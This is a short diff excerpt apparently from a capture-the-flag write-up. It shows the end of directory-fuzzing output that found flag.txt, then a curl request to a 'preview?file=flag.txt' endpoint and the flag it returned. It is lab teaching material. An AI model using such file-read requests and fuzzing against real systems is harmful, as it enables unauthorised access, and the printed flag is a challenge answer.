@@ -556,3 +556,11 @@ ________________________________________________
 flag.txt                [Status: 200, Size: 53, Words: 1, Lines: 1, Duration: 225ms]
 :: Progress: [23730/23730] :: Job [1/1] :: 83 req/sec :: Duration: [0:04:45] :: Errors: 0 ::
 ```
+
+I grab the flag;
+
+```
+┌──(mopsy㉿APHP)-[~/H4K-IT]
+└─$ curl "http://68.183.205.254:34715/preview?file=flag.txt"
+<pre>h4kit{insecure_pipeline_exec_4212f73ceac2}</pre>
+```
